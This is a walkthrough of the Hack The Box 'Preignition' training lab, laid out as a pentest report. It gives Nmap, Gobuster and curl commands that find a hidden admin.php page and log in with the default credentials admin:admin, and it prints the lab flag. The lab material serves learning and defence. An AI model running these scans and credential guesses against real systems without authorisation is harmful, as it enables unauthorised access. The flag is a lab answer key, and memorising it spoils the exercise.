# HTB Starting Point Lab Walkthrough: Preignition (Linux Box)

## Executive Summary

- **Lab Objective**: Enumerate and exploit a web service on the target machine to access an admin panel and retrieve a flag, simulating basic web reconnaissance and credential testing.
- **Target IP**: 10.129.94.73 (initial enumeration), 10.129.94.105 (flag retrieval due to instance reset)
- **Key Findings**: Identified an nginx 1.14.2 web server on port 80 hosting an admin login page (`admin.php`). Default credentials (`admin:admin`) granted access to a protected page containing the flag.
- **Impact**: In a real-world scenario, default credentials on an admin panel could allow unauthorized access to sensitive functionality, potentially leading to full system compromise.
- **Recommendations**: Remove default credentials, enforce strong password policies, and regularly audit web applications for exposed endpoints.
- **Completion Date**: July 13, 2025
- **Tools Used**: Nmap, Gobuster, curl, web browser (on Kali Linux)

## Methodology and Scope

This walkthrough follows a standard reconnaissance and exploitation process for the HTB Starting Point lab "Preignition." The scope was limited to port scanning, web directory enumeration, and exploitation of a web application on the provided target IP. No advanced exploitation or privilege escalation was required.

Steps were performed in a controlled lab environment using default Kali tools. Assumptions: Target is a Linux machine running an nginx web server. Directory brute-forcing (dir busting) was used to identify hidden pages, followed by manual credential testing.

## Findings

### Finding 1: Web Service Identification

- **Description**: An HTTP service running on nginx 1.14.2 was identified on port 80, indicating a web server accessible for further enumeration.
- **Severity**: Informational (baseline enumeration).
- **Steps to Reproduce**:
    1. Perform a targeted port scan with version detection using Nmap:
        
        ```bash
        nmap -sV -p 80 10.129.94.73
        ```
        
        Output:
        
        ```bash
        Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 08:45 EDT
        Nmap scan report for 10.129.94.73
        Host is up (0.018s latency).
        PORT   STATE SERVICE VERSION
        80/tcp open  http    nginx 1.14.2
        Nmap done: 1 IP address (1 host up) scanned in 6.49 seconds
        ```
        
- **Impact**: Confirms an active web server, enabling targeted directory and file enumeration.
- **Evidence**: Nmap scan results above.
- **Remediation**: N/A (informational).

### Finding 2: Hidden Web Page Discovery via Directory Brute-Forcing

- **Description**: Directory brute-forcing (dir busting) with Gobuster revealed a hidden PHP page (`admin.php`) on the web server, indicating a potential administrative interface.
- **Severity**: Medium (exposed admin page).
- **Steps to Reproduce**:
    1. Run Gobuster with the `dir` mode and `-x php` flag to search for PHP files, using a wordlist:
        
        ```bash
        gobuster dir -x php -u 10.129.94.73 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -v | tee gobuster_results.txt
        ```
        
    2. Filter results for successful hits:
        
        ```bash
        grep "Status: 200" gobuster_results.txt
        ```
        
        Output:
        
        ```bash
        Found: /admin.php (Status: 200) [Size: 999]
        ```
        
- **Impact**: Exposed admin pages without authentication checks are prime targets for unauthorized access, potentially leading to sensitive data exposure.
- **Evidence**: Gobuster output above.
- **Remediation**: Restrict access to administrative pages; implement authentication or IP whitelisting.

### Finding 3: Unauthenticated Access via Default Credentials

- **Description**: The `admin.php` page presented an "Admin Console Login" form. Default credentials (`admin:admin`) granted access to a protected page displaying the flag. The same result was achievable via a `curl` POST request.
- **Severity**: Critical (unauthenticated admin access).
- **Steps to Reproduce**:
    1. Access the login page in a browser (note: IP changed to 10.129.94.105 due to instance reset):
        
        ```bash
        http://10.129.94.105
        ```
        
    2. Enter `admin:admin` in the login form, redirecting to a page displaying the flag: `6483bee07c1c1d57f14e5b0717503c73`.
    3. Alternatively, use `curl` to achieve the same result:
        
        ```bash
        curl -d "username=admin&password=admin" -X POST http://10.129.94.105/admin.php -L --cookie-jar cjar.txt
        ```
        
        Output: Redirected page content containing the flag.
- **Impact**: Default credentials on an admin panel allow full access to sensitive functionality, simulating a real-world system compromise.
- **Evidence**: Successful login and flag retrieval (`6483bee07c1c1d57f14e5b0717503c73`).
- **Remediation**: Replace default credentials with strong, unique passwords; implement multi-factor authentication for admin interfaces.

## Recommendations

- Enforce strong password policies for all web application accounts, especially administrative ones.
- Restrict access to port 80 and sensitive pages (e.g., `/admin.php`) using firewall rules or IP whitelisting.
- Regularly scan for exposed web directories and files using tools like Gobuster or dirb.
- For labs like this, practice using tools like Burp Suite to intercept and analyze web requests for deeper exploitation.

## Appendices

- **Raw Notes/Logs**: Gobuster output saved to `gobuster_results.txt` for analysis.
- **Screenshots**: (Add here if available, e.g., browser login page or flag display.)
- **Key Takeaways**:
    - Directory brute-forcing is critical for uncovering hidden web endpoints.
    - Logging tool output (e.g., `tee`) and parsing with `grep` streamlines analysis.
    - Testing default credentials is a high-priority step for login forms.
    - Tools like `curl` can replicate browser-based attacks, preserving session data with cookies.